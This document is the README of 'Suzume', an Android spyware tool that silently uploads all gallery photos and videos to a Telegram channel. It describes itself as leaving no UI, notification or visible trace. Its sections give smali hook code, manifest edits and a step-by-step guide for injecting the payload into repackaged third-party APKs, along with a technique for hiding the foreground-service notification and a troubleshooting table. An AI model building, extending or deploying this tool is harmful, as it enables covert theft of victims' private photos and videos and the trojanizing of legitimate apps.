# Suzume

Silent Android background service that automatically uploads all photos and videos from a device gallery to a Telegram channel — no UI, no notification, no visible trace.

---

## Table of Contents

1. [Overview](#overview)
2. [System Architecture](#system-architecture)
3. [Project Structure](#project-structure)
4. [Build System](#build-system)
5. [Configuration](#configuration)
6. [Standalone App Usage](#standalone-app-usage)
7. [Injection Guide](#injection-guide)
8. [Errors and Fixes](#errors-and-fixes)
9. [Smali Reference](#smali-reference)
10. [Notes and Limitations](#notes-and-limitations)

---

## Overview

Suzume has 2 Java files and 1 XML file (manifest only — no layout XML). Once the user opens the host app and grants storage permission, the service starts, verifies credentials with Telegram, and silently streams every photo and video to the configured channel. It resumes exactly where it left off if stopped or killed.

**What it does**

- Scans the device gallery (images + videos) using MediaStore
- Sends each file to Telegram via Bot API (`sendDocument`)
- Runs as a silent foreground service — invisible to the user (no notification)
- Saves uploaded file IDs to SharedPreferences for resume support
- Retries failed uploads up to 3 times with exponential backoff
- Supports public channels (`@username`) and private channels (numeric ID)
- Skips files over 50 MB (Telegram Bot API hard limit)
- 2 parallel upload threads for speed

**Two deployment modes**

1. **Standalone APK** — build, install, and run Suzume directly
2. **Injected** — inject Suzume's DEX and a Smali hook into any third-party APK so the service starts silently when that app opens

---

## System Architecture

```
MainActivity.java  (Activity)
  └─ askPermissions()
       └─ [permission granted]
            └─ startService(inq)
                 └─ finish()   ← Activity dies immediately

inq.java  (Foreground Service)
  └─ onStartCommand()
       ├─ silentForeground()       ← IMPORTANCE_NONE channel, invisible
       └─ executor.execute()
            ├─ stopForeground(true) ← removes even the silent notification
            └─ runUpload()
                 ├─ hasStoragePermission()
                 ├─ getMe()              ← verify BOT_TOKEN
                 ├─ sendText()           ← verify CHANNEL_ID
                 ├─ collectMedia()       ← MediaStore scan
                 ├─ filter via SharedPreferences (skip already uploaded)
                 └─ 2-thread ExecutorService
                      ├─ Thread A: uploadWithRetry(uri) → sendDocument()
                      └─ Thread B: uploadWithRetry(uri) → sendDocument()
```

**Data flow**

```
Device Gallery (MediaStore)
    ↓  content://media/external/images/media/N
collectMedia()
    ↓  ArrayList<Uri>
Filter via SharedPreferences (skip already uploaded IDs)
    ↓  pending URIs only
2× concurrent threads
    ↓  multipart/form-data POST
Telegram Bot API  →  /sendDocument
    ↓  HTTP 200
markDone(id)  →  SharedPreferences (suzume_done)
```

**File roles**

| File | Type | Role |
|---|---|---|
| `MainActivity.java` | Activity | Runtime permissions + start service + finish immediately |
| `inq.java` | Service | All logic: credential check, media scan, upload, resume, retry |
| `AndroidManifest.xml` | XML | Declares Activity, Service, all permissions. Only XML in project. |

---

## Project Structure

```
Svault/
├── .github/
│   └── workflows/
│       └── build.yml                   ← GitHub Actions CI
├── app/
│   ├── src/
│   │   └── main/
│   │       ├── java/com/tenix/svault/
│   │       │   ├── MainActivity.java   ← permissions + launch service
│   │       │   └── inq.java            ← all logic (Foreground Service)
│   │       ├── res/
│   │       │   ├── mipmap-mdpi/ic_launcher.png      (48×48)
│   │       │   ├── mipmap-hdpi/ic_launcher.png      (72×72)
│   │       │   ├── mipmap-xhdpi/ic_launcher.png     (96×96)
│   │       │   ├── mipmap-xxhdpi/ic_launcher.png    (144×144)
│   │       │   └── mipmap-xxxhdpi/ic_launcher.png   (192×192)
│   │       └── AndroidManifest.xml     ← ONLY XML file
│   └── build.gradle
├── build.gradle
└── settings.gradle
```

**Key details**

- Package: `com.tenix.svault`
- Min SDK: 21 (Android 5.0)
- Target SDK: 34 (Android 14)
- Build output: debug APK (no keystore needed)
- External dependencies: none — pure Android SDK → single `classes.dex`
- `multiDexEnabled false` set explicitly in `app/build.gradle`

---

## Build System

Builds via GitHub Actions. No Gradle wrapper JAR in the repo — the wrapper is generated at build time.

**Workflow file:** `.github/workflows/build.yml`

```yaml
name: Build Svault APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Setup Gradle 8.5
        uses: gradle/actions/setup-gradle@v3
        with:
          gradle-version: '8.5'

      - name: Accept Android SDK Licenses
        run: yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses || true

      - name: Generate Gradle Wrapper
        run: |
          gradle wrapper --gradle-version 8.5 --distribution-type bin
          chmod +x gradlew

      - name: Build Debug APK
        run: ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Svault-APK
          path: app/build/outputs/apk/debug/*.apk
```

**Steps explained**

1. `actions/checkout@v4` — clones the repo
2. `setup-java@v4` — installs JDK 17 (required by AGP 8.3)
3. `setup-gradle@v3` — downloads Gradle 8.5, puts it on PATH
4. `sdkmanager --licenses` — accepts Android SDK licenses silently
5. `gradle wrapper` — generates `gradlew` + wrapper JAR at runtime (no binary in repo)
6. `assembleDebug` — compiles Java → DEX → packages APK
7. `upload-artifact` — APK available to download from the Actions run page

**APK location:** `app/build/outputs/apk/debug/app-debug.apk`

**Manual trigger:** GitHub repo → Actions tab → Build Svault APK → Run workflow

**AGP ↔ Gradle compatibility**

| AGP version | Min Gradle |
|---|---|
| 8.3.x | 8.4+ |
| 8.1.x | 8.0+ |

This project uses AGP 8.3.2 + Gradle 8.5.

---

## Configuration

All credentials are in `inq.java` at the top — declared as `static String` (NOT `final`) so the Smali compiler does not inline them into every usage site.

```java
static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
static String CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
```

### Setting credentials — 2 ways

**Way 1 — Before build (edit Java source)**

Open `app/src/main/java/com/tenix/svault/inq.java`, replace the placeholders, push to GitHub, let Actions build.

```java
static String BOT_TOKEN  = "1234567890:ABCxxxxxxxxxxxxxxxxxx";
static String CHANNEL_ID = "@yourchannel";  // or -1001234567890
```

**Way 2 — After build (edit Smali via MT Manager)**

Open APK in MT Manager → `classes.dex` → `com/tenix/svault/inq.smali` → find `<clinit>` method:

```smali
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "YOUR_BOT_TOKEN_HERE"    ← change this value only
    sput-object v0, Lcom/tenix/svault/inq;->BOT_TOKEN:Ljava/lang/String;

    const-string v1, "YOUR_CHANNEL_ID_HERE"   ← change this value only
    sput-object v1, Lcom/tenix/svault/inq;->CHANNEL_ID:Ljava/lang/String;

    return-void
.end method
```

Replace only the string values. Save → Sign → Install.

> **Why `static` not `static final`?**
> `static final String` is inlined by the Java compiler — the token appears at every usage site in Smali (5+ copies). `static String` compiles to a single `const-string` in `<clinit>`, making it easy to find and change in one place.

### Telegram Bot setup

1. Open `@BotFather` in Telegram → `/newbot` → follow prompts → copy the token
2. Token format: `1234567890:ABCdefGHIjklMNOpqrSTUvwxYZ123456789`
3. Add the bot to your channel as **Admin** with **Post Messages** permission enabled

### Channel ID formats

| Channel type | Format | Example |
|---|---|---|
| Public | `@username` | `@mychannel` |
| Private | `-100` + numeric ID | `-1001234567890` |

**How to get a private channel's numeric ID:**

Forward any message from the private channel to `@userinfobot` in Telegram. It replies with `ID: -1001234567890`.

Alternatively: open `https://api.telegram.org/bot<TOKEN>/getUpdates` in a browser after the bot sends a message in the channel — look for `"chat":{"id":-1001234567890}`.

---

## Standalone App Usage

### Step 1 — Set credentials

Edit `inq.java` or set via Smali after build (see Configuration above).

### Step 2 — Push to GitHub

```bash
git add .
git commit -m "set credentials"
git push
```

GitHub Actions builds automatically. Repo → Actions → latest run → download `Svault-APK` artifact → extract `app-debug.apk`.

### Step 3 — Install

Enable "Install from unknown sources" on the device. Install `app-debug.apk`.

### Step 4 — Run

Open the app. The system permission dialog appears requesting storage access. Tap **Allow**. The app immediately closes — this is normal. The service starts silently in the background.

### What happens next

- First message in channel: `🔵 Suzume backup started`
- Files arrive in the channel as documents with original filenames and extensions (e.g. `IMG_20261108_123456.jpg`, `VID_001.mp4`)
- No notification appears at any point
- If the phone restarts or the app is killed, reopen the app — service resumes from where it stopped
- When all files are uploaded, service stops itself silently

### Re-run behavior

Suzume tracks every uploaded file by its MediaStore numeric ID. Opening the app again after a completed run sends only new files added since the last run. Already-uploaded files are skipped automatically.

### Clearing upload history (force full re-upload)

Device Settings → Apps → find the app → Storage → **Clear Data**. This wipes SharedPreferences and Suzume will re-upload everything on the next run.

---

## Injection Guide

Inject Suzume into any third-party APK so it runs silently when that app opens. The target app's users never see a separate Suzume app.

**Requirements**
- MT Manager (King version recommended)
- Suzume APK (built with correct token + channel ID already set)
- Target APK
- Android device with MT Manager installed

---

### Step 1 — Set credentials in Suzume APK first

Before injecting, make sure the token and channel ID are set in the Suzume APK.

Open Suzume APK → `classes.dex` → `com/tenix/svault/inq.smali` → find `<clinit>` → edit the two `const-string` values → save → sign.

---

### Step 2 — Extract Suzume's DEX

```
Open Suzume APK in MT Manager
  ↓
Long-press classes.dex → Extract
  ↓
Save to /sdcard/Download/ or any folder
  ↓
Rename the file → classes15.dex
  (use the next available number for your target:
   if target has classes.dex through classes14.dex → name it classes15.dex)
```

---

### Step 3 — Add DEX to target APK

```
Open target APK in MT Manager
  ↓
Tap + button (bottom of screen)
  ↓
Select classes15.dex → Add
```

Android loads all DEX files in a multi-DEX APK automatically. No merging needed.

---

### Step 4 — Edit target AndroidManifest.xml

Open `AndroidManifest.xml` inside the target APK and add:

**Inside `<application>` tag** — after the closing `>` of the `<application` opening tag, before the first `<activity>`:

```xml
<service
    android:name="com.tenix.svault.inq"
    android:foregroundServiceType="dataSync"
    android:exported="false" />
```

**Inside `<manifest>` tag** — alongside the existing `<uses-permission>` lines:

```xml
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
<uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
<uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
```

> ⚠️ **Common mistake:** Placing `<service>` inside the `<application` attributes block (before the closing `>`). This causes "name expected" error. The `<service>` must come AFTER the `>` that closes the `<application` opening tag.

**Correct structure:**

```xml
<application
    android:theme="..."
    android:label="..."
    android:icon="...">    ← the closing > must be here first

    <service                ← then service goes here
        android:name="com.tenix.svault.inq"
        android:foregroundServiceType="dataSync"
        android:exported="false" />

    <activity ...>
```

---

### Step 5 — Add hook method to target MainActivity.smali

Open the original `classes.dex` → find `MainActivity.smali` → scroll to the very end (before `.end class`) → add this private method:

```smali
.method private startSuzume()V
    .locals 2

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/tenix/svault/inq;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method
```

This method uses only v0 and v1 (always in the valid v0–v15 range) so there is no register conflict.

---

### Step 6 — Call the hook from onCreate

Find the `onCreate` method in the same `MainActivity.smali` file. Add one line immediately after `invoke-super`:

**Check `.registers` value at the top of `onCreate`:**

```smali
.method public onCreate(Landroid/os/Bundle;)V
    .registers 19     ← check this number
```

**Rule:** `p0 = registers - 2` (for a 2-parameter non-static method)

| `.registers` | p0 maps to | Which instruction |
|---|---|---|
| ≤ 17 | v0 – v15 | `invoke-direct {p0}` |
| 18 | v16 | `invoke-direct/range {p0 .. p0}` |
| 19 | v17 | `invoke-direct/range {p0 .. p0}` |
| 20+ | v18+ | `invoke-direct/range {p0 .. p0}` |

Replace `com/target/app/MainActivity` with the actual package path visible at the top of the file as `.class public Lcom/target/app/MainActivity;`.

**If `.registers ≤ 17`:**

```smali
invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

invoke-direct {p0}, Lcom/target/app/MainActivity;->startSuzume()V
```

**If `.registers ≥ 18` (e.g. `.registers 19`):**

```smali
invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

invoke-direct/range {p0 .. p0}, Lcom/target/app/MainActivity;->startSuzume()V
```

**Full example with `.registers 19`:**

```smali
.method public final onCreate(Landroid/os/Bundle;)V
    .registers 19

    .param p1    # Landroid/os/Bundle;

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-direct/range {p0 .. p0}, Lcom/bendingspoons/remini/MainActivity;->startSuzume()V

    .line 10
    invoke-static {p0}, Lcom/google/firebase/analytics/FirebaseAnalytics;->getInstance(Landroid/content/Context;)Lcom/google/firebase/analytics/FirebaseAnalytics;

    # ... rest of original code unchanged ...
```

---

### Step 7 — Save, sign, install

```
Save all edits in MT Manager
  ↓
MT Manager → ⋮ menu or top bar → Sign
  ↓
Install the signed APK
  ↓
Open the target app → grant storage permission when prompted
  ↓
Suzume service starts silently
  ↓
Check your Telegram channel — "🔵 Suzume backup started" appears
```

---

## Errors and Fixes

### Build errors

| Error | Cause | Fix |
|---|---|---|
| `SDK location not found` | `local.properties` missing | Add `echo "sdk.dir=$ANDROID_HOME" > local.properties` to workflow |
| `Minimum supported Gradle version is 8.x` | AGP 8.3 needs Gradle 8.4+ | Workflow uses `gradle-version: '8.5'` — keep it |
| `error: package android.Manifest does not exist` | Missing import | Add `import android.Manifest;` to inq.java |
| `AAPT: resource mipmap/ic_launcher not found` | Icon PNG missing | Re-run the Python icon resize script |
| `Execution failed for task :app:compileDebugJavaWithJavac` | Java syntax error | Check inq.java for typos |

### Runtime errors (notification messages)

| Notification | Cause | Fix |
|---|---|---|
| `❌ Bot token invalid! Code: 404` | Token is placeholder or wrong format | Edit `<clinit>` in Smali or rebuild with correct token |
| `❌ Bot token invalid! Code: 401` | Token revoked or malformed | Create a new bot via @BotFather |
| `❌ Channel error! Code: 400` | Bot not admin, or channel ID wrong | Add bot as Admin; verify channel ID |
| `❌ Channel error! Code: 400 chat not found` | Channel not found | Public: `@username`; Private: `-100xxxxxxxxxx` |
| `❌ No storage permission!` | Service started without storage permission | Reopen app and grant permission |
| `📂 Found 0 media files` | No images/videos, or MediaStore query failed | Check gallery has files; check permission |

### Smali injection errors

| Error | Cause | Fix |
|---|---|---|
| `Invalid register: v17. Must be between v0 and v15` | High register with `invoke-direct` | Use `invoke-direct/range {p0 .. p0}` |
| `name expected` (XML error) | `<service>` placed inside `<application` attributes | Move `<service>` after the closing `>` of `<application` |
| App crashes immediately on open | `inq` class not in target DEX | Extract Suzume's `classes.dex`, rename to `classes15.dex`, add to target APK |
| App crashes immediately on open | `inq` service not declared in manifest | Add `<service android:name="com.tenix.svault.inq" …/>` |
| App crashes immediately on open | Missing foreground service permissions | Add `FOREGROUND_SERVICE` + `FOREGROUND_SERVICE_DATA_SYNC` permissions |
| `ClassNotFoundException: com.tenix.svault.inq` | DEX not properly added | Verify `classes15.dex` appears in target APK root |
| Install fails after edit | APK not re-signed | MT Manager → Sign → install signed output |

### Upload issues

| Symptom | Cause | Fix |
|---|---|---|
| `🔵 Suzume backup started` sent but no files after | `collectMedia()` returned 0 | Check storage permission; verify gallery has files |
| Files sent without extension | Old version — `filename="file"` hardcoded | Rebuild from latest ZIP |
| Some files never sent | Files over 50 MB are skipped | Expected — Telegram Bot API hard limit |
| Upload stops and never resumes | Old version ran in Activity thread | Rebuild — now uses Foreground Service with `START_STICKY` |
| `429 Too Many Requests` errors | Sending too fast | Built-in retry with backoff handles this automatically |
| Nothing sent after test message | Service crashed between sendText and collectMedia | Check for `❌ Crashed:` notification; rebuild latest ZIP |

---

## Smali Reference

### How registers work

```
Total registers  =  .registers  N
Parameters       =  2  (p0 = this,  p1 = Bundle)  for non-static onCreate
Local registers  =  N - 2

p0 maps to register  N - 2
p1 maps to register  N - 1

Example: .registers 19
  p0 = v17   ← INVALID for invoke-direct {p0}  (max is v15)
  p1 = v18
  Local registers available: v0 through v16
```

### `invoke-direct` vs `invoke-direct/range`

| Instruction | Allowed registers | When to use |
|---|---|---|
| `invoke-direct {p0}` | v0–v15 only | `.registers ≤ 17` |
| `invoke-direct/range {p0 .. p0}` | any | `.registers ≥ 18` |
| `invoke-virtual {p0, v0}` | v0–v15 only | registers are small |
| `invoke-virtual/range {p0 .. v0}` | any | registers are large |

### Why `startSuzume()` helper method solves the register problem

Calling `startService()` requires `new-instance` and `const-class` which only work on v0–v15. If `onCreate` has `.registers 19`, then v0–v15 are already allocated. Rather than increasing `.registers` and renumbering, a separate private method is added. That method has its own fresh `.locals 2` scope (always v0 and v1), always valid. The call to `startSuzume()` from `onCreate` only needs `p0` via `/range`.

### Hook — full code reference

```smali
# ═══════════════════════════════════════════════════
# ADD BEFORE .end class (at end of MainActivity.smali)
# ═══════════════════════════════════════════════════

.method private startSuzume()V
    .locals 2

    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/tenix/svault/inq;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void

.end method


# ═══════════════════════════════════════════════════
# ADD IN onCreate, AFTER invoke-super
# ═══════════════════════════════════════════════════

# If .registers ≤ 17  (p0 = v15 or below):
invoke-direct {p0}, Lcom/your/target/MainActivity;->startSuzume()V

# If .registers ≥ 18  (p0 = v16 or above):
invoke-direct/range {p0 .. p0}, Lcom/your/target/MainActivity;->startSuzume()V
```

### `<clinit>` structure after compilation

`static String` (not `final`) compiles to a static field initialized in `<clinit>`:

```smali
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "1234567890:ABCxxxxxxxxxxxxxxxxxx"   ← BOT_TOKEN
    sput-object v0, Lcom/tenix/svault/inq;->BOT_TOKEN:Ljava/lang/String;

    const-string v1, "-1001234567890"                     ← CHANNEL_ID
    sput-object v1, Lcom/tenix/svault/inq;->CHANNEL_ID:Ljava/lang/String;

    return-void
.end method
```

One `const-string` per value. Easy to locate and edit in MT Manager.

---

## Notes and Limitations

### Telegram Bot API limits

- **Max file size:** 50 MB per file — larger files are silently skipped
- **Rate limit:** ~20 messages/minute recommended for one channel — built-in 350 ms delay between files handles this
- **Bot must be Admin** in the channel with **Post Messages** permission

### Android version behavior

| Android version | API | Storage permission behavior |
|---|---|---|
| 5.0–5.1 | 21–22 | No runtime permissions — uploads start immediately |
| 6.0–9.0 | 23–28 | Requests `READ_EXTERNAL_STORAGE` |
| 10–12 | 29–32 | Requests `READ_EXTERNAL_STORAGE` (maxSdkVersion 32) |
| 13+ | 33+ | Requests `READ_MEDIA_IMAGES` + `READ_MEDIA_VIDEO` |
| 14 | 34 | Also requires `FOREGROUND_SERVICE_DATA_SYNC` permission |

### Silent foreground service technique

Android requires all foreground services to show a notification. Suzume bypasses this visually:

1. Creates a notification channel with `IMPORTANCE_NONE` — notifications are never displayed
2. Calls `startForeground()` with this invisible notification (required API call)
3. Calls `stopForeground(true)` from the background thread immediately after, removing even the invisible notification

Result: nothing ever appears in the notification drawer or status bar.

### Resume system

Uploaded file IDs are saved to `SharedPreferences` file `suzume_done` under key `ids` as `Set<String>`. Each entry is the MediaStore numeric ID of a successfully uploaded file. On restart, only files whose ID is not in this set are uploaded.

To force a full re-upload: device Settings → Apps → host app → Storage → **Clear Data**.

### Single DEX guarantee

`multiDexEnabled false` is set in `app/build.gradle`. With zero external dependencies, all Suzume classes fit in one `classes.dex` well under the 65,536 method limit. This is important for injection — a single DEX file is added to the target APK.

### File extension fix

Files are uploaded using the actual `DISPLAY_NAME` from MediaStore (e.g. `IMG_20261108_123456.jpg`). If `DISPLAY_NAME` is unavailable, a fallback name is generated from the MIME type: `media_<timestamp>.jpg`.

### Parallel upload note

Two concurrent threads means 2 files upload simultaneously. With the 350 ms delay per thread, effective throughput is roughly 1 file per 350 ms (combined ~5 files per second at minimum). Actual speed depends on file size and network bandwidth. The 350 ms delay prevents Telegram's rate limit (`429 Too Many Requests`).

---

*Package: `com.tenix.svault` · App label: Suzume · Built by TENIx*
